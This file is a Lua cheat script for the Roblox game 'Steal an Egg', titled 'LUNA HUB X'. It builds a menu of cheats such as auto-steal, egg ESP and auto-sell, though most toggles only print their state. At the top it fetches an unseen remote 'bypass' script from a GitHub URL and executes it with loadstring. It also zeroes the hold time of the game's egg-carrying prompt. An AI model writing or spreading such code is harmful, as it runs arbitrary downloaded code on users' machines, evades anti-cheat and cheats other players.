-- ============================================================
-- ============================================================
-- ============================================================
-- ============================================================
pcall(function(...)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Sayrealll/hub/refs/heads/main/bypass"))()
end)

-- ============================================================
-- ============================================================
-- ============================================================
-- ============================================================
-- ============================================================
-- ============================================================
-- ============================================================
-- ============================================================

local Players           = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService        = game:GetService("RunService")
local Workspace         = game:GetService("Workspace")
local UserInputService  = game:GetService("UserInputService")
local LocalPlayer       = Players.LocalPlayer

-- ============================================================
-- ============================================================
-- ============================================================
-- ============================================================
-- ============================================================
-- ============================================================
-- ============================================================
-- ============================================================
-- ============================================================
-- ============================================================

-- GLOBAL STATE & FUNCTIONS DECLARATION (FIXES CRASH)
local State = {
    hatchEnabled = false,
    hatchInterval = 1,
    autoStealEnabled = false,
    autoPlaceEnabled = false,
    autoSellEggsEnabled = false,
    autoUpgradePen = false,
    autoTreadmillTraining = false,
    autoTreadmillUpgrade = false,
    autoEquipBest = false,
    claimOffline = false,
    autoSellPets = false,
    eggEsp = false,
    fpsBoost = false,
    selectedStealRarities = {},
    selectedSellRarities = {},
    selectedPetRarities = {},
}

local Functions = {}
local EggState


-- Shared Rarity List
local RarityList = {
    "Common", "Uncommon", "Rare", "Epic",
    "Legendary", "Mythic", "Cosmic", "Secret",
    "Eternal", "Divine"
}

-- ============================================================
-- ============================================================
-- ============================================================
-- ============================================================
-- ============================================================
-- ============================================================
-- ============================================================
local cloneref = (cloneref or clonereference or function(instance)
	return instance
end)
local ReplicatedStorage = cloneref(game:GetService("ReplicatedStorage"))
local RunService = cloneref(game:GetService("RunService"))

local WindUI

do
	local ok, result = pcall(function()
		return require("./src/Init")
	end)

	if ok then
		WindUI = result
	else
		if RunService:IsStudio() or not writefile then
			WindUI = require(ReplicatedStorage:WaitForChild("WindUI"):WaitForChild("Init"))
		else
			WindUI =
				loadstring(game:HttpGet("https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua"))()
		end
	end
end

--WindUI.TransparencyValue = .9
local ThemeName = "Dark"

local Window = WindUI:CreateWindow({
	Title = " LUNA HUB X ",
	Author = " STEAL AN EGG ",
	Icon = "solar:wind-bold",
	Theme = ThemeName,
	--NewElements = true,
	--Transparent = true,
	ToggleKey = Enum.KeyCode.F,
	--Acrylic = true,

	--[[
	KeySystem = {
		Title = "Key System",
		Description = "Enter the correct key to unlock the window",
		KeyValidator = function(key)
			return key == "HelloWorld"
		end,
	}
	]]
})

Window:Tag({
	Title = "v1.0.0.1",
	Color = "ElementBackground",
})

--[[Window:Section({
	Title = "Silent",
})
	]]


-- ============================================================
-- ============================================================
-- ============================================================
-- ============================================================
-- ============================================================

local Tab = Window:Tab({ Title = "DISCORD", Icon = "discord" })
local Tab1  = Window:Tab({ Title = "EGGS", Icon = "egg" })
local Tab2  = Window:Tab({ Title = "PROGRESSION", Icon = "money" })
local Tab3  = Window:Tab({ Title = "PETS", Icon = "dog" })
local Tab4  = Window:Tab({ Title = "RIFT", Icon = "discord" })
local Tab5  = Window:Tab({ Title = "CONTEST", Icon = "sword" })
local Tab6  = Window:Tab({ Title = "VISUAL", Icon = "discord" })
local Tab7  = Window:Tab({ Title = "WEBHOOK", Icon = "hook" })
local Tab8  = Window:Tab({ Title = "SETTINGS", Icon = "settings" })

-- ============================================================
-- ============================================================
-- ============================================================
-- ============================================================
-- ============================================================
--[[local InfoTab = Window:Tab({
	Title = "ESP",
	Icon = "badge-info",
})


InfoTab:Paragraph({
	Title = "WindUI",
	Desc = "WindUI is a open source UI library for Roblox Script Hubs",
	Buttons = {
		{
			Title = "GitHub",
			Callback = function()
				print("GitHub Button Clicked")
			end,
		},
		{
			Title = "Documentation",
			Variant = "Secondary",
			Callback = function()
				print("Documentation Button Clicked")
			end,
		},
	},
})

local HStack1 = InfoTab:HStack()

local VStackLeft = HStack1:VStack()
local VStackRight = HStack1:VStack()

VStackLeft:Button({
	Title = "Reload UI",
	Justify = "Center",
	Icon = "refresh-ccw",
	IconAlign = "Left",
	Color = Color3.fromHex("#F44732"),
	Callback = function()
		print("Reloading UI...")
	end,
})

VStackRight:Button({
	Title = "Rejoin Place",
	Justify = "Center",
	Icon = "log-out",
	IconAlign = "Left",
	Color = Color3.fromHex("#f4b332"),
	Callback = function()
		print("Rejoining place...")
	end,
})
]]


-- ============================================================
-- ============================================================
-- ============================================================
-- ============================================================
-- ============================================================
--NO PROMPT

local utility = {
    ProximityPromptService = game:GetService("ProximityPromptService"),
    Players = game:GetService("Players"),
    conns = {},
}

function utility:bind(connection, callback)
    local s, r = pcall(function(...)
        local conn = connection:Connect(callback)
        self.conns[conn] = conn
        return self.conns[conn]
    end)
    if s and r then
        return r
    end
    return warn('failed to bind connection error: '..tostring(r))
end

function utility:unbind(connection)
    local s, r = pcall(function(...)
        local conn = self.conns[connection]
        if conn then
            conn:Disconnect()
            conn = nil

            return true
        end
        return false
    end)
    if s and r then
        return true
    end
    return warn("failed to unbind")
end

function utility:init()
    self.LocalPlayer = self.Players.LocalPlayer
    if not self.LocalPlayer then
        return warn('failed to get localplayer')
    end

    local connection = self:bind(self.ProximityPromptService.PromptButtonHoldBegan, function(ProximityPrompt, Player)
        if Player == self.LocalPlayer and tostring(ProximityPrompt) == "CarryAreaEgg" then
            ProximityPrompt.HoldDuration = 0
        end
    end)

    if not connection then
        return warn("some how failed to create conn")
    end

    return warn("Success init")
end

utility:init()

-- ============================================================
-- ============================================================
-- ============================================================
-- ============================================================
-- ============================================================


-- Toggle Callback Handlers
function Functions.OnToggleAutoSteal(state)
    State.autoStealEnabled = state
    print("Auto Steal state:", state)
end

function Functions.OnToggleAutoPlace(state)
    State.autoPlaceEnabled = state
    print("Auto Place state:", state)
end

function Functions.OnToggleAutoHatch(state)
    State.hatchEnabled = state
    print("Auto Hatch state:", state)
    if state then
        setclipboard("https://discord.gg/yourlink")
    end
end

function Functions.OnToggleAutoSellEggs(state)
    State.autoSellEggsEnabled = state
    print("Auto Sell Eggs state:", state)
end

function Functions.OnToggleAutoUpgradePen(state)
    State.autoUpgradePen = state
    print("Auto Upgrade Pen state:", state)
end

function Functions.OnToggleAutoTreadmillTraining(state)
    State.autoTreadmillTraining = state
    print("Auto Treadmill Training state:", state)
end

function Functions.OnToggleAutoTreadmillUpgrade(state)
    State.autoTreadmillUpgrade = state
    print("Auto Treadmill Upgrade state:", state)
end

function Functions.OnToggleAutoEquipBest(state)
    State.autoEquipBest = state
    print("Auto Equip Best Pets state:", state)
end

function Functions.OnToggleClaimOffline(state)
    State.claimOffline = state
    print("Claim Offline Earnings state:", state)
end

function Functions.OnToggleAutoSellPets(state)
    State.autoSellPets = state
    print("Auto Sell Pets state:", state)
end

function Functions.OnToggleEggESP(state)
    State.eggEsp = state
    print("Egg ESP state:", state)
end

function Functions.OnToggleFPSBoost(state)
    State.fpsBoost = state
    print("FPS Boost state:", state)
end

-- Dropdown Handlers
function Functions.OnStealFilterChange(selectedValue)
    State.selectedStealRarities = selectedValue
    local result = type(selectedValue) == "table" and table.concat(selectedValue, ", ") or tostring(selectedValue)
    print("Steal Filter Selected:", result)
end

function Functions.OnSellFilterChange(selectedValue)
    State.selectedSellRarities = selectedValue
    local result = type(selectedValue) == "table" and table.concat(selectedValue, ", ") or tostring(selectedValue)
    print("Sell Filter Selected:", result)
end

function Functions.OnPetFilterChange(selectedValue)
    State.selectedPetRarities = selectedValue
    local result = type(selectedValue) == "table" and table.concat(selectedValue, ", ") or tostring(selectedValue)
    print("Pet Filter Selected:", result)
end


-- ============================================================
-- ============================================================
-- ============================================================
-- ============================================================
-- ============================================================
-- ============================================================
-- ============================================================
-- ============================================================
-- ============================================================

local Section = Tab1:Section({ Title = "Auto Steal", Box = true, BoxBorder = true })
Section:Toggle({
    Title = "Auto Steal Egg",
    Value = State.autoStealEnabled,
    Callback = Functions.OnToggleAutoSteal,
})

local Section1 = Tab1:Section({ Title = "Auto Steal Filter", Box = true, BoxBorder = true })
Section1:Dropdown({
    Title = "Rarities",
    Values = RarityList,
    Value = nil,
    AllowNone = true,
    Multi = true,
    Callback = Functions.OnStealFilterChange,
})

local Section2 = Tab1:Section({ Title = "Auto Place & Hatch", Box = true, BoxBorder = true })
Section2:Toggle({
    Title = "Auto Place All Eggs",
    Value = State.autoPlaceEnabled,
    Callback = Functions.OnToggleAutoPlace,
})

Section2:Toggle({
    Title = "Auto Hatch Ready",
    Desc = "Automatically hatches owned eggs when ready",
    Value = State.hatchEnabled,
    Callback = Functions.OnToggleAutoHatch,
})

local Section3 = Tab1:Section({ Title = "Auto Sell Egg", Box = true, BoxBorder = true })
Section3:Dropdown({
    Title = "Rarities",
    Values = RarityList,
    Value = nil,
    AllowNone = true,
    Multi = true,
    Callback = Functions.OnSellFilterChange,
})

Section3:Toggle({
    Title = "Auto Sell Eggs",
    Value = State.autoSellEggsEnabled,
    Callback = Functions.OnToggleAutoSellEggs,
})

-- ============================================================
-- TAB 2: PROGRESSION
-- ============================================================
local Section4 = Tab2:Section({ Title = "Upgrades", Box = true, BoxBorder = true })

Section4:Paragraph({ Title = "Pen", Box = false, BoxBorder = false, Justify = "Center" })
Section4:Toggle({
    Title = "Auto Upgrade Pen",
    Value = State.autoUpgradePen,
    Callback = Functions.OnToggleAutoUpgradePen,
})

Section4:Paragraph({ Title = "Treadmill", Box = false, BoxBorder = false, Justify = "Center" })
Section4:Toggle({
    Title = "Auto Treadmill Training",
    Value = State.autoTreadmillTraining,
    Callback = Functions.OnToggleAutoTreadmillTraining,
})

Section4:Toggle({
    Title = "Auto Treadmill Upgrade",
    Value = State.autoTreadmillUpgrade,
    Callback = Functions.OnToggleAutoTreadmillUpgrade,
})

-- ============================================================
-- TAB 3: PETS
-- ============================================================
local Section5 = Tab3:Section({ Title = "Pets", Box = true, BoxBorder = true })

Section5:Toggle({
    Title = "Auto Equip Best Pets",
    Value = State.autoEquipBest,
    Callback = Functions.OnToggleAutoEquipBest,
})

Section5:Toggle({
    Title = "Claim Offline Earnings",
    Value = State.claimOffline,
    Callback = Functions.OnToggleClaimOffline,
})

Section5:Paragraph({ Title = "Auto Sell Pets", Box = false, BoxBorder = false, Justify = "Center" })
Section5:Dropdown({
    Title = "Rarities",
    Values = RarityList,
    Value = nil,
    AllowNone = true,
    Multi = true,
    Callback = Functions.OnPetFilterChange,
})

Section5:Toggle({
    Title = "Auto Sell",
    Value = State.autoSellPets,
    Callback = Functions.OnToggleAutoSellPets,
})

-- ============================================================
-- TAB 6: VISUAL
-- ============================================================
local Section7 = Tab6:Section({ Title = "EGG ESP", Box = true, BoxBorder = true })

Section7:Toggle({
    Title = "EGG ESP",
    Value = State.eggEsp,
    Callback = Functions.OnToggleEggESP,
})

Section7:Paragraph({ Title = "PERFORMANCE", Box = false, BoxBorder = false, Justify = "Center" })

Section7:Toggle({
    Title = "FPS BOOST",
    Value = State.fpsBoost,
    Callback = Functions.OnToggleFPSBoost,
})


--[[local EmptyTab = Window:Tab({
	Title = "Custom empty page tab",

	CustomEmptyPage = {
		Icon = "lucide:smile",
		Title = "This is a cool empty tab",
		Desc = "I like it. its so great tab with cool 'custom empty page'",
	},
})]]
